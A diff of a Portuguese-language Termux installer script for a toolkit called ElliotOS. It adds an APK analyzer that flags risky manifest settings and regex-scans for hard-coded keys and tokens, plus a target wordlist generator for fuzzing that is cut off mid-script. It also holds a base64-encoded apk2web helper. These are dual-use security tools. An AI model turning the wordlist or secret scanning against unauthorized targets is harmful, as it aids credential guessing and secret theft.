zZT0kKGJhc2VuYW1lICIkQVBLX0ZJTEUiIC5hcGspCiAgICBPVVRfRElSPSIuLyR7X2Jhc2V9X3dlYiIKICBmaQoKICAjIFZlcmlmaWNhciBjb2xpc2FvCiAgaWYgWyAtZCAiJE9VVF9ESVIiIF0gJiYgWyAiJEZPUkNFIiAtZXEgMCBdOyB0aGVuCiAgICBwcmludGYgJ1wwMzNbMTszM20gIERpcmV0b3JpbyAiJXMiIGphIGV4aXN0ZS5cMDMzWzBtXG4nICIkT1VUX0RJUiIKICAgIHByaW50ZiAnICBTb2JyZXNjcmV2ZXI/IFtzL05dICcKICAgIHJlYWQgLXIgX3Jlc3AKICAgIGNhc2UgIiRfcmVzcCIgaW4KICAgICAgc3xTfHl8WSkgOiA7OwogICAgICAqKSBwcmludGYgJyAgQ2FuY2VsYWRvLlxuXG4nOyBleGl0IDAgOzsKICAgIGVzYWMKICBmaQoKICBfaGVhZCAnd2ViMmFwayBhcGsyd2ViJwogIF9pbmZvICJBUEsgICAgOiAkQVBLX0ZJTEUiCiAgX2luZm8gIlNhaWRhICA6ICRPVVRfRElSIgoKICBta2RpciAtcCAiJE9VVF9ESVIiCgogICMg4pSA4pSAIDEuIEV4dHJhaXIgaW5mbyBkbyBwYWNvdGUgdmlhIGFhcHQvYWFwdDIg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgbG9jYWwgX3BrZ19pbmZvPScnCiAgaWYgY29tbWFuZCAtdiBhYXB0ID4vZGV2L251bGwgMj4mMTsgdGhlbgogICAgX3BrZ19pbmZvPSQoYWFwdCBkdW1wIGJhZGdpbmcgIiRBUEtfRklMRSIgMj4vZGV2L251bGwgfCBoZWFkIC01KQogIGVsaWYgY29tbWFuZCAtdiBhYXB0MiA+L2Rldi9udWxsIDI+JjE7IHRoZW4KICAgIF9wa2dfaW5mbz0kKGFhcHQyIGR1bXAgYmFkZ2luZyAiJEFQS19GSUxFIiAyPi9kZXYvbnVsbCB8IGhlYWQgLTUpCiAgZmkKCiAgaWYgWyAtbiAiJF9wa2dfaW5mbyIgXTsgdGhlbgogICAgbG9jYWwgX3BrZ19uYW1lIF9hcHBfbGFiZWwgX3ZlcnNpb25fbmFtZSBfdmVyc2lvbl9jb2RlCiAgICBfcGtnX25hbWU9JChwcmludGYgJyVzJyAiJF9wa2dfaW5mbyIgfCBncmVwIC1vICJuYW1lPSdbXiddKiciIHwgaGVhZCAtMSB8IHNlZCAicy9uYW1lPScvLztzLycvLyIpCiAgICBfYXBwX2xhYmVsPSQocHJpbnRmICclcycgIiRfcGtnX2luZm8iIHwgZ3JlcCAtbyAibGFiZWw9J1teJ10qJyIgfCBoZWFkIC0xIHwgc2VkICJzL2xhYmVsPScvLztzLycvLyIpCiAgICBfdmVyc2lvbl9uYW1lPSQocHJpbnRmICclcycgIiRfcGtnX2luZm8iIHwgZ3JlcCAtbyAidmVyc2lvbk5hbWU9J1teJ10qJyIgfCBoZWFkIC0xIHwgc2VkICJzL3ZlcnNpb25OYW1lPScvLztzLycvLyIpCiAgICBfdmVyc2lvbl9jb2RlPSQocHJpbnRmICclcycgIiRfcGtnX2luZm8iIHwgZ3JlcCAtbyAidmVyc2lvbkNvZGU9J1teJ10qJyIgfCBoZWFkIC0xIHwgc2VkICJzL3ZlcnNpb25Db2RlPScvLztzLycvLyIpCiAgICBbIC1uICIkX3BrZ19uYW1lIiAgICBdICYmIF9pbmZvICJQYWNrYWdlICAgICA6ICRfcGtnX25hbWUiCiAgICBbIC1uICIkX2FwcF9sYWJlbCIgICBdICYmIF9pbmZvICJBcHAgTmFtZSAgICA6ICRfYXBwX2xhYmVsIgogICAgWyAtbiAiJF92ZXJzaW9uX25hbWUiXSAmJiBfaW5mbyAiVmVyc2FvICAgICAgOiAkX3ZlcnNpb25fbmFtZSAoY29kZTogJF92ZXJzaW9uX2NvZGUpIgogIGZpCgogICMg4pSA4pSAIDIuIEV4dHJhaXIgY29udGV1ZG8gd2ViIHZpYSBQeXRob24gKHppcGZpbGUpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIF9pbmZvICdFeHRyYWluZG8gYXJxdWl2b3Mgd2ViLi4uJwoKICBweXRob24zIC0gIiRBUEtfRklMRSIgIiRPVVRfRElSIiA8PCAnUFlFT0YnCmltcG9ydCBzeXMsIG9zLCB6aXBmaWxlCgphcGtfcGF0aCA9IHN5cy5hcmd2WzFdCm91dF9kaXIgID0gc3lzLmFyZ3ZbMl0KCiMgRXh0ZW5zb2VzIHdlYiBxdWUgcXVlcmVtb3MgZXh0cmFpcgpXRUJfRVhUUyA9IHsnLmh0bWwnLCcuaHRtJywnLmNzcycsJy5qcycsJy5qc29uJywnLnN2ZycsJy54bWwnLAogICAgICAgICAgICAnLnBuZycsJy5qcGcnLCcuanBlZycsJy5naWYnLCcud2VicCcsJy5pY28nLAogICAgICAgICAgICAnLnR0ZicsJy53b2ZmJywnLndvZmYyJywnLm90ZicsCiAgICAgICAgICAgICcubXAzJywnLm9nZycsJy53YXYnLCcubXA0JywnLndlYm0nLAogICAgICAgICAgICAnLnR4dCcsJy5tZCd9Cgpjb3VudHMgPSB7J2h0bWwnOjAsJ2Nzcyc6MCwnanMnOjAsJ290aGVyJzowLCdza2lwcGVkJzowfQoKd2l0aCB6aXBmaWxlLlppcEZpbGUoYXBrX3BhdGgsICdyJykgYXMgemY6CiAgICBlbnRyaWVzID0gemYubmFtZWxpc3QoKQoKICAgICMgVGVudGEgZXh0cmFpciBkZSBhc3NldHMvd3d3LyBwcmltZWlybyAocGFkcmFvIHdlYjJhcGspCiAgICB3ZWJfcHJlZml4ID0gJ2Fzc2V0cy93d3cvJwogICAgd2ViX2VudHJpZXMgPSBbZSBmb3IgZSBpbiBlbnRyaWVzIGlmIGUuc3RhcnRzd2l0aCh3ZWJfcHJlZml4KSBhbmQgbm90IGUuZW5kc3dpdGgoJy8nKV0KCiAgICAjIFNlIG5hbyBhY2hhciBhc3NldHMvd3d3LywgdGVudGEgYXNzZXRzLyBkaXJldG8KICAgIGlmIG5vdCB3ZWJfZW50cmllczoKICAgICAgICB3ZWJfcHJlZml4ID0gJ2Fzc2V0cy8nCiAgICAgICAgd2ViX2VudHJpZXMgPSBbZSBmb3IgZSBpbiBlbnRyaWVzIGlmIGUuc3RhcnRzd2l0aCh3ZWJfcHJlZml4KSBhbmQgbm90IGUuZW5kc3dpdGgoJy8nKV0KCiAgICAjIEZpbHRyYXIgcG9yIGV4dGVuc29lcyB3ZWIKICAgIGRlZiBpc193ZWIocGF0aCk6CiAgICAgICAgXywgZXh0ID0gb3MucGF0aC5zcGxpdGV4dChwYXRoLmxvd2VyKCkpCiAgICAgICAgcmV0dXJuIGV4dCBpbiBXRUJfRVhUUyBvciBleHQgPT0gJycKCiAgICB3ZWJfZW50cmllcyA9IFtlIGZvciBlIGluIHdlYl9lbnRyaWVzIGlmIGlzX3dlYihlKV0KCiAgICBpZiBub3Qgd2ViX2VudHJpZXM6CiAgICAgICAgcHJpbnQoJyAgXDAzM1sxOzMzbSAgISBOZW5odW0gYXJxdWl2byB3ZWIgZW5jb250cmFkbyBlbSBhc3NldHMvd3d3LyBvdSBhc3NldHMvXDAzM1swbScpCiAgICAgICAgcHJpbnQoJyAgICBMaXN0YW5kbyB0b2RvcyBvcyBhcnF1aXZvcyBubyBBUEs6JykKICAgICAgICBmb3IgZSBpbiBlbnRyaWVzWzozMF06CiAgICAgICAgICAgIHByaW50KGYnICAgIHtlfScpCiAgICAgICAgaWYgbGVuKGVudHJpZXMpID4gMzA6CiAgICAgICAgICAgIHByaW50KGYnICAgIC4uLiAoe2xlbihlbnRyaWVzKS0zMH0gbWFpcyknKQogICAgICAgIHN5cy5leGl0KDApCgogICAgIyBFeHRyYWlyIHJlbW92ZW5kbyBvIHByZWZpeG8gKGFzc2V0cy93d3cvIC0+IHJhaXogZG8gb3V0X2RpcikKICAgIGZvciBlbnRyeSBpbiB3ZWJfZW50cmllczoKICAgICAgICByZWxhdGl2ZSA9IGVudHJ5W2xlbih3ZWJfcHJlZml4KTpdCiAgICAgICAgaWYgbm90IHJlbGF0aXZlOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGRlc3QgPSBvcy5wYXRoLmpvaW4ob3V0X2RpciwgcmVsYXRpdmUpCiAgICAgICAgb3MubWFrZWRpcnMob3MucGF0aC5kaXJuYW1lKGRlc3QpLCBleGlzdF9vaz1UcnVlKQogICAgICAgIHdpdGggemYub3BlbihlbnRyeSkgYXMgc3JjLCBvcGVuKGRlc3QsICd3YicpIGFzIGRzdDoKICAgICAgICAgICAgZHN0LndyaXRlKHNyYy5yZWFkKCkpCiAgICAgICAgZXh0ID0gb3MucGF0aC5zcGxpdGV4dChyZWxhdGl2ZS5sb3dlcigpKVsxXQogICAgICAgIGlmIGV4dCBpbiAoJy5odG1sJywnLmh0bScpOiBjb3VudHNbJ2h0bWwnXSArPSAxCiAgICAgICAgZWxpZiBleHQgPT0gJy5jc3MnOiAgICAgICAgIGNvdW50c1snY3NzJ10gICs9IDEKICAgICAgICBlbGlmIGV4dCA9PSAnLmpzJzogICAgICAgICAgY291bnRzWydqcyddICAgKz0gMQogICAgICAgIGVsc2U6ICAgICAgICAgICAgICAgICAgICAgICBjb3VudHNbJ290aGVyJ10rPSAxCgp0b3RhbCA9IHN1bShjb3VudHMudmFsdWVzKCkpCnByaW50KGYnICBcMDMzWzE7MzJtICBvayBFeHRyYWlkb3Mge3RvdGFsfSBhcnF1aXZvc1wwMzNbMG0nKQpwcmludChmJyAgXDAzM1swOzkwbSAgICAgSFRNTDoge2NvdW50c1siaHRtbCJdfSAgQ1NTOiB7Y291bnRzWyJjc3MiXX0gIEpTOiB7Y291bnRzWyJqcyJdfSAgT3V0cm9zOiB7Y291bnRzWyJvdGhlciJdfVwwMzNbMG0nKQpQWUVPRgoKICAjIOKUgOKUgCAzLiBMaXN0YXIgbyBxdWUgZm9pIGV4dHJhaWRvIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGxvY2FsIF9uX2h0bWwgX25fY3NzIF9uX2pzIF9uX3RvdGFsCiAgX25faHRtbD0kKGZpbmQgIiRPVVRfRElSIiAtdHlwZSBmIC1pbmFtZSAiKi5odG1sIiAyPi9kZXYvbnVsbCB8IHdjIC1sKQogIF9uX2Nzcz0kKGZpbmQgICIkT1VUX0RJUiIgLXR5cGUgZiAtaW5hbWUgIiouY3NzIiAgMj4vZGV2L251bGwgfCB3YyAtbCkKICBfbl9qcz0kKGZpbmQgICAiJE9VVF9ESVIiIC10eXBlIGYgLWluYW1lICIqLmpzIiAgIDI+L2Rldi9udWxsIHwgd2MgLWwpCiAgX25fdG90YWw9JChmaW5kICIkT1VUX0RJUiIgLXR5cGUgZiAyPi9kZXYvbnVsbCB8IHdjIC1sKQoKICBpZiBbICIkX25fdG90YWwiIC1ndCAwIF07IHRoZW4KICAgIHByaW50ZiAnXG5cMDMzWzE7MzJtICA9PSBSZXN1bHRhZG8gPT1cMDMzWzBtXG5cbicKICAgIF9vayAiRGlyZXRvcmlvIiAiJE9VVF9ESVIiCgogICAgaWYgWyAiJF9uX2h0bWwiIC1ndCAwIF07IHRoZW4KICAgICAgX2luZm8gIkFycXVpdm9zIEhUTUwgKCRfbl9odG1sKToiCiAgICAgIGZpbmQgIiRPVVRfRElSIiAtdHlwZSBmIC1pbmFtZSAiKi5odG1sIiB8IHNvcnQgfCBzZWQgInN8JE9VVF9ESVIvfHwiIHwgd2hpbGUgcmVhZCAtciBfZjsgZG8KICAgICAgICBfZGltICIgICRfZiIKICAgICAgZG9uZQogICAgZmkKCiAgICBpZiBbICIkX25fY3NzIiAtZ3QgMCBdOyB0aGVuCiAgICAgIF9pbmZvICJBcnF1aXZvcyBDU1MgKCRfbl9jc3MpOiIKICAgICAgZmluZCAiJE9VVF9ESVIiIC10eXBlIGYgLWluYW1lICIqLmNzcyIgfCBzb3J0IHwgc2VkICJzfCRPVVRfRElSL3x8IiB8IHdoaWxlIHJlYWQgLXIgX2Y7IGRvCiAgICAgICAgX2RpbSAiICAkX2YiCiAgICAgIGRvbmUKICAgIGZpCgogICAgaWYgWyAiJF9uX2pzIiAtZ3QgMCBdOyB0aGVuCiAgICAgIF9pbmZvICJBcnF1aXZvcyBKUyAoJF9uX2pzKToiCiAgICAgIGZpbmQgIiRPVVRfRElSIiAtdHlwZSBmIC1pbmFtZSAiKi5qcyIgfCBzb3J0IHwgc2VkICJzfCRPVVRfRElSL3x8IiB8IHdoaWxlIHJlYWQgLXIgX2Y7IGRvCiAgICAgICAgX2RpbSAiICAkX2YiCiAgICAgIGRvbmUKICAgIGZpCgogICAgcHJpbnRmICdcbicKICAgIF9kaW0gIlZlciB0b2RvczogbHMgLWxhICckT1VUX0RJUiciCiAgICBfZGltICJSZWJ1aWxkOiAgIHdlYjJhcGsgYnVpbGQgJyRPVVRfRElSJyAtLW5hbWUgXCJBcHBcIiIKICAgIHByaW50ZiAnXG4nCiAgZWxzZQogICAgX3dhcm4gIk5lbmh1bSBhcnF1aXZvIHdlYiBmb2kgZXh0cmFpZG8uIgogICAgX2RpbSAiTyBBUEsgcG9kZSBuYW8gc2VyIHVtIHdlYnZpZXcgYXBwIChuYXRpdm8gSmF2YS9Lb3RsaW4sIFJlYWN0IE5hdGl2ZSwgRmx1dHRlciwgZXRjLikiCiAgICBwcmludGYgJ1xuJwogIGZpCn0KCmNhc2UgIiR7MTotaGVscH0iIGluCiAgYnVpbGQpICAgIHNoaWZ0OyBfY21kX2J1aWxkICAgICIkQCIgOzsKICBhcGsyd2ViKSAgc2hpZnQ7IF9jbWRfYXBrMndlYiAgIiRAIiA7OwogIHRlbXBsYXRlKSBzaGlmdDsgX2NtZF90ZW1wbGF0ZSAiJEAiIDs7CiAgY2hlY2spICAgIHNoaWZ0OyBfY21kX2NoZWNrICAgICIkQCIgOzsKICBtYW58LS1tYW4pICAgICAgX2NtZF9tYW4gIDs7CiAgaGVscHwtLWhlbHB8LWgpIF9jbWRfaGVscCA7OwogICopIGlmIFsgLWYgIiQxIiBdICYmIHByaW50ZiAnJXMnICIkMSIgfCBncmVwIC1xaSAnXC5hcGskJzsgdGhlbiBfY21kX2FwazJ3ZWIgIiRAIgogICAgIGVsaWYgWyAtZCAiJDEiIF0gfHwgWyAiJDEiID0gJy0tdXJsJyBdOyB0aGVuIF9jbWRfYnVpbGQgIiRAIgogICAgIGVsc2UgX2NtZF9oZWxwOyBmaSA7Owplc2FjCg=='
 import base64 as _b64
 script = _b64.b64decode(script_b64).decode('utf-8')
 with open(path, 'w') as f:
@@ -95383,6 +95646,430 @@ PYEOF
   chmod +x "$W2A_BIN"
   printf "\033[1;32m  web2apk instalado em %s\033[0m\n" "$W2A_BIN"
   printf "\n\033[1;33m  Uso:\033[0m web2apk build ./meuapp/ --name \"App\" --perm camera,mic\n\n"
+}
+
+
+# ── apkinspect ─────────────────────────────────────────────────────────────
+_backend_apkinspect() {
+    local PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
+    local BIN="$PREFIX/bin/apkinspect"
+
+    # aapt é muito mais leve que androguard — sem pip, sem compilação Rust
+    if ! command -v aapt >/dev/null 2>&1 && ! command -v aapt2 >/dev/null 2>&1; then
+        _info "Instalando aapt (necessário para decodificar o manifest)..."
+        pkg install -y aapt 2>/dev/null || _warn "aapt não instalado — análise de manifest limitada"
+    else
+        _ok "aapt disponível: $(command -v aapt 2>/dev/null || command -v aapt2 2>/dev/null)"
+    fi
+
+    _info "Instalando script apkinspect..."
+    cat > "$BIN" << 'APKINSPECT_EOF'
+#!/usr/bin/env python3
+# apkinspect — ElliotOS APK Analyzer
+# Zero dependências pip — usa aapt + apksigner + Python stdlib (zipfile, re, hashlib)
+import sys, os, re, zipfile, subprocess, shutil, hashlib
+
+# ── output helpers ──────────────────────────────────────────────────────────
+def _hdr(t):    print(f"\n\033[1;35m── {t} {'─'*(48-len(t))}\033[0m")
+def _ok(k,v):   print(f"  \033[1;32m{k:<24}\033[0m {v}")
+def _warn(k,v): print(f"  \033[1;33m{k:<24}\033[0m {v}")
+def _item(v):   print(f"  \033[0;90m• {v}\033[0m")
+def _flag(cond, k, good, bad): (_warn if cond else _ok)(k, bad if cond else good)
+
+def run(*cmd):
+    try:
+        r = subprocess.run(list(cmd), capture_output=True, text=True, timeout=60)
+        return r.stdout + r.stderr
+    except Exception: return ""
+
+# ── entry point ─────────────────────────────────────────────────────────────
+if len(sys.argv) < 2 or sys.argv[1] in ('-h','--help'):
+    print("\n\033[1;35m  apkinspect — ElliotOS APK Analyzer\033[0m")
+    print("  Sem dependências pip — usa aapt + apksigner + Python stdlib\n")
+    print("  Uso: apkinspect <arquivo.apk>\n")
+    sys.exit(0)
+
+apk = sys.argv[1]
+if not os.path.isfile(apk):
+    print(f"\033[1;31m[✗] Arquivo não encontrado: {apk}\033[0m"); sys.exit(1)
+
+AAPT    = shutil.which('aapt') or shutil.which('aapt2')
+APKSIGN = shutil.which('apksigner')
+
+sha256 = hashlib.sha256(open(apk,'rb').read()).hexdigest()
+bname  = os.path.basename(apk)
+fsize  = os.path.getsize(apk)
+
+print(f"\n\033[1;35m╔══════════════════════════════════════════════════════════╗\033[0m")
+print(f"\033[1;35m║  apkinspect — {bname:<42} ║\033[0m")
+print(f"\033[1;35m╚══════════════════════════════════════════════════════════╝\033[0m")
+
+# ══════════════════════════════════════════════════════════════════════════════
+# 1. aapt dump badging — info básica e permissões
+# ══════════════════════════════════════════════════════════════════════════════
+badging = run(AAPT, 'dump', 'badging', apk) if AAPT else ""
+
+def _bval(pattern, text, grp=1):
+    m = re.search(pattern, text)
+    return m.group(grp) if m else "—"
+
+pkg    = _bval(r"package: name='([^']+)'",    badging)
+vname  = _bval(r"versionName='([^']+)'",      badging)
+vcode  = _bval(r"versionCode='([^']+)'",      badging)
+label  = _bval(r"application-label(?:-\w+)?:'([^']+)'", badging)
+minsdk = _bval(r"sdkVersion:'([^']+)'",       badging)
+tgtsdk = _bval(r"targetSdkVersion:'([^']+)'", badging)
+
+_hdr("INFO GERAL")
+_ok("Package:",      pkg)
+_ok("App Name:",     label)
+_ok("Version Name:", vname)
+_ok("Version Code:", vcode)
+_ok("Min SDK:",      minsdk)
+_ok("Target SDK:",   tgtsdk)
+_ok("SHA256:",       sha256)
+_ok("Tamanho:",      f"{fsize//1024} KB")
+if not AAPT:
+    print("  \033[0;90m  (aapt não encontrado — instale apkfull para dados completos)\033[0m")
+
+# ══════════════════════════════════════════════════════════════════════════════
+# 2. aapt dump xmltree — manifest decodificado (flags + componentes)
+# ══════════════════════════════════════════════════════════════════════════════
+xmltree = run(AAPT, 'dump', 'xmltree', apk, 'AndroidManifest.xml') if AAPT else ""
+
+def _bool_attr(name, tree, default=False):
+    m = re.search(rf'android:{name}[^=]*=\(type 0x12\)(0x\w+)', tree)
+    if m: return m.group(1) == '0x1'
+    # também tenta formato sem parênteses: android:debuggable="true"
+    m2 = re.search(rf'android:{name}[^=]*="(true|false)"', tree)
+    if m2: return m2.group(1) == 'true'
+    return default
+
+debuggable = _bool_attr('debuggable', xmltree, False)
+bk_m = re.search(r'android:allowBackup[^=]*=\(type 0x12\)(0x\w+)', xmltree)
+allow_bk = (bk_m.group(1) == '0x1') if bk_m else True   # padrão = true se ausente
+nsc_attr = bool(re.search(r'android:networkSecurityConfig', xmltree))
+
+try:
+    with zipfile.ZipFile(apk) as z:
+        zlist = z.namelist()
+except Exception:
+    zlist = []
+nsc = nsc_attr or any('network_security_config' in f for f in zlist)
+
+_hdr("FLAGS DE SEGURANÇA")
+_flag(debuggable, "Debuggable:",       "false ✓",   "⚠ TRUE — debug remoto possível!")
+_flag(allow_bk,   "AllowBackup:",      "false ✓",   "⚠ TRUE — dados via adb backup")
+_ok("Net Sec Config:", "✓ presente"   if nsc  else "ausente")
+
+# ══════════════════════════════════════════════════════════════════════════════
+# 3. Permissões
+# ══════════════════════════════════════════════════════════════════════════════
+DANGEROUS = {
+    'READ_SMS','SEND_SMS','RECEIVE_SMS','READ_CONTACTS','WRITE_CONTACTS',
+    'READ_CALL_LOG','PROCESS_OUTGOING_CALLS','RECORD_AUDIO','CAMERA',
+    'ACCESS_FINE_LOCATION','ACCESS_COARSE_LOCATION','READ_EXTERNAL_STORAGE',
+    'WRITE_EXTERNAL_STORAGE','MANAGE_EXTERNAL_STORAGE','GET_ACCOUNTS',
+    'SYSTEM_ALERT_WINDOW','USE_BIOMETRIC','USE_FINGERPRINT',
+    'BIND_ACCESSIBILITY_SERVICE','READ_PHONE_STATE','CALL_PHONE',
+}
+perms_b = re.findall(r"uses-permission(?:-sdk-\d+)?: name='([^']+)'", badging)
+perms_x = re.findall(r'A: android:name[^"]*"(android\.permission\.[^"]+)"', xmltree)
+perms   = sorted(set(perms_b + perms_x))
+
+_hdr(f"PERMISSÕES ({len(perms)})")
+for p in perms:
+    short = p.replace('android.permission.','')
+    if any(d in short for d in DANGEROUS): _warn("  ⚠", p)
+    else: _item(p)
+
+# ══════════════════════════════════════════════════════════════════════════════
+# 4. Componentes
+# ══════════════════════════════════════════════════════════════════════════════
+def _components(tag, tree):
+    items = []
+    lines = tree.splitlines()
+    for i, line in enumerate(lines):
+        if re.search(rf'\bE: {tag}\b', line):
+            for j in range(i+1, min(i+8, len(lines))):
+                nm = re.search(r'A: android:name[^"]*"([^"]+)"', lines[j])
+                if nm: items.append(nm.group(1)); break
+                if re.match(r'\s+E: ', lines[j]) and j > i+1: break
+    return items
+
+acts  = _components('activity', xmltree)
+svcs  = _components('service',  xmltree)
+rcvs  = _components('receiver', xmltree)
+prvs  = _components('provider', xmltree)
+# fallback badging para activities
+if not acts:
+    acts = re.findall(r"launchable-activity: name='([^']+)'", badging)
+
+for lbl, lst in [("ACTIVITIES",acts),("SERVICES",svcs),("RECEIVERS",rcvs),("PROVIDERS",prvs)]:
+    _hdr(f"{lbl} ({len(lst)})")
+    for x in lst: _item(x)
+
+# ══════════════════════════════════════════════════════════════════════════════
+# 5. Deep Links / URL Schemes
+# ══════════════════════════════════════════════════════════════════════════════
+schemes = list(set(re.findall(r'android:scheme[^"]*"([^"]+)"', xmltree)))
+hosts   = list(set(re.findall(r'android:host[^"]*"([^"]+)"',   xmltree)))
+paths   = list(set(re.findall(r'android:path(?:Prefix|Pattern)?[^"]*"([^"]+)"', xmltree)))
+
+if schemes or hosts:
+    _hdr("DEEP LINKS / URL SCHEMES")
+    for s in schemes: _item(f"scheme:  {s}")
+    for h in hosts:   _item(f"host:    {h}")
+    for p in paths:   _item(f"path:    {p}")
+
+# ══════════════════════════════════════════════════════════════════════════════
+# 6. Strings suspeitas — scan do ZIP (DEX + assets)
+# ══════════════════════════════════════════════════════════════════════════════
+_hdr("STRINGS SUSPEITAS")
+
+TEXT_EXT = ('.js','.json','.xml','.html','.htm','.properties','.txt',
+            '.cfg','.yaml','.yml','.env','.config')
+
+url_re = re.compile(rb'https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&()*+,;=%]{8,120}')
+api_re = re.compile(rb'(?i)(?:api[_\-]?key|token|secret|passwd?|password|credential)["\']?\s*[:=]\s*["\']?([A-Za-z0-9/_\-+.]{10,60})')
+ip_re  = re.compile(rb'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)(?::\d{2,5})?\b')
+ep_re  = re.compile(rb'(?i)(?:/api/|/v\d+/|/rest/|/graphql)[a-zA-Z0-9/_\-?=&.]{3,80}')
+ascii_re = re.compile(rb'[ -~]{6,}')   # extrai strings legíveis de DEX binário
+
+NOISE_URLS = ('schemas.android.com','xmlpull.org','www.w3.org','apache.org',
+              'google.com/intl','play.google.com/about','goo.gl/YCi','ietf.org')
+
+urls,apis,ips,eps = set(),set(),set(),set()
+
+try:
+    with zipfile.ZipFile(apk) as z:
+        for name in z.namelist():
+            try:
+                raw = z.read(name)
+                if name.endswith('.dex'):
+                    data = b'\n'.join(m.group() for m in ascii_re.finditer(raw))
+                elif any(name.lower().endswith(e) for e in TEXT_EXT):
+                    data = raw
+                else:
+                    continue
+                for m in url_re.findall(data):
+                    u = m.decode('utf-8','replace')
+                    if not any(n in u for n in NOISE_URLS): urls.add(u)
+                for m in api_re.findall(data):
+                    apis.add(m.decode('utf-8','replace')[:50])
+                for m in ip_re.findall(data):
+                    ip = m.decode('utf-8','replace')
+                    if not ip.startswith(('127.','10.','0.','192.168.','172.','255.')):
+                        ips.add(ip)
+                for m in ep_re.findall(data):
+                    eps.add(m.decode('utf-8','replace')[:80])
+            except Exception: pass
+except Exception as e:
+    _item(f"Erro ao ler APK como ZIP: {e}")
+
+if urls:
+    print(f"  \033[1;36mURLs ({len(urls)}):\033[0m")
+    for u in sorted(urls)[:30]: _item(u)
+if eps:
+    print(f"\n  \033[1;36mEndpoints ({len(eps)}):\033[0m")
+    for e in sorted(eps)[:20]: _item(e)
+if ips:
+    print(f"\n  \033[1;36mIPs externos ({len(ips)}):\033[0m")
+    for ip in sorted(ips): _item(ip)
+if apis:
+    print(f"\n  \033[1;33m⚠ Possíveis chaves/tokens ({len(apis)}):\033[0m")
+    for ak in sorted(apis): _warn("  !", ak)
+if not (urls or eps or ips or apis):
+    _item("Nenhuma string suspeita encontrada.")
+
+# ══════════════════════════════════════════════════════════════════════════════
+# 7. Certificado
+# ══════════════════════════════════════════════════════════════════════════════
+_hdr("CERTIFICADO")
+
+if APKSIGN:
+    cert_out = run(APKSIGN, 'verify', '--print-certs', apk)
+    printed = False
+    for line in cert_out.splitlines():
+        line = line.strip()
+        if not line or 'WARNING' in line or line.startswith('Verifies'): continue
+        k, _, v = line.partition(':')
+        _ok(k.strip()+':', v.strip()) if v else _item(line)
+        printed = True
+    if not printed: _item("apksigner não retornou certificado (APK pode não estar assinado).")
+else:
+    # fallback: lê META-INF/*.RSA/.DSA e extrai strings ASN.1 legíveis
+    try:
+        with zipfile.ZipFile(apk) as z:
+            cf = [n for n in z.namelist() if re.match(r'META-INF/.*\.(RSA|DSA|EC)$',n,re.I)]
+            if cf:
+                raw = z.read(cf[0])
+                hits = [s.decode('ascii','replace') for s in re.findall(rb'[ -~]{5,}', raw)
+                        if any(k in s.decode('ascii','replace') for k in [b'CN=',b'O=',b'C=',b'OU='])]
+                for h in hits: _item(h)
+                _item(f"(instale apksigner para detalhes completos)")
+            else:
+                _item("Nenhum arquivo de assinatura em META-INF/")
+    except Exception as ex:
+        _item(f"Erro ao ler certificado: {ex}")
+
+print()
+APKINSPECT_EOF
+
+    chmod +x "$BIN"
+    _ok "apkinspect instalado em $BIN"
+    printf "\n  \033[1;33mUso:\033[0m apkinspect app.apk\n\n"
+}
+
+# ── wordmagic ──────────────────────────────────────────────────────────────
+_backend_wordmagic() {
+    local PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
+    local BIN="$PREFIX/bin/wordmagic"
+
+    _info "Instalando script wordmagic..."
+    cat > "$BIN" << 'WORDMAGIC_EOF'
+#!/usr/bin/env python3
+# wordmagic — ElliotOS Smart Wordlist Generator
+import sys, os, re, itertools
+from datetime import datetime
+
+HELP = """
+\033[1;35m  wordmagic — ElliotOS Wordlist Generator\033[0m
+
+  \033[1;32mUso:\033[0m
+    wordmagic <alvo>                  Gera wordlist para domínio ou empresa
+    wordmagic <alvo> -o out.txt       Salva em arquivo
+    wordmagic <alvo> --full           Inclui variações mais longas/combinadas
+    wordmagic <alvo> --min 6          Tamanho mínimo (padrão: 4)
+    wordmagic <alvo> --max 20         Tamanho máximo (padrão: 18)
+
+  \033[1;32mExemplos:\033[0m
+    wordmagic empresa.com
+    wordmagic "Empresa SA" -o words.txt --full
+    wordmagic target.com.br --min 8 -o fuzz.txt
+
+  \033[0;90mFontes: nome, siglas, anos, cidades BR, sufixos comuns,
+  prefixos de serviço, leet speak e combinações.\033[0m
+"""
+
+if len(sys.argv) < 2 or sys.argv[1] in ('-h','--help'):
+    print(HELP); sys.exit(0)
+
+target = sys.argv[1]
+out_file = None; full_mode = False; min_len = 4; max_len = 18
+i = 2
+while i < len(sys.argv):
+    arg = sys.argv[i]
+    if arg in ('-o','--output') and i+1 < len(sys.argv):
+        out_file = sys.argv[i+1]; i += 2
+    elif arg == '--full':
+        full_mode = True; i += 1
+    elif arg == '--min' and i+1 < len(sys.argv):
+        min_len = int(sys.argv[i+1]); i += 2
+    elif arg == '--max' and i+1 < len(sys.argv):
+        max_len = int(sys.argv[i+1]); i += 2
+    else: i += 1
+
+raw = re.sub(r'(?i)(https?://)?(www\.)?', '', target).lower()
+raw_clean = raw.split('/')[0]
+parts = [p for p in re.split(r'[\.\-_\s]+', raw_clean)
+         if p and p not in ('com','net','org','io','br','co','edu','gov','www','app','dev','')]
+name = parts[0] if parts else raw_clean.replace('.','')
+
+print(f"\n\033[1;35m╔══════════════════════════════════════════════════════════╗\033[0m")
+print(f"\033[1;35m║  wordmagic — alvo: {target:<38} ║\033[0m")
+print(f"\033[1;35m╚══════════════════════════════════════════════════════════╝\033[0m")
+print(f"  \033[0;90m→ Nome: '{name}'  |  Partes: {parts}  |  Modo full: {full_mode}\033[0m")
+
+words = set()
